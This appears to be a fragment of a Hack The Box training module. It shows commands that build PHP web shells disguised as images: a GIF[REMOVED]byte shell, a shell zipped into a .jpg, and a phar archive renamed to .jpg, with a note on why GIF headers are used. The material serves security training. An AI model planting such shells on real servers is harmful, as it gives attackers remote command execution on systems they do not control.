...
EssMack90@htb[/htb]`$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
...
**Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://enterprise.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.
...
EssMack90@htb[/htb]`$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
...
EssMack90@htb[/htb]`$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
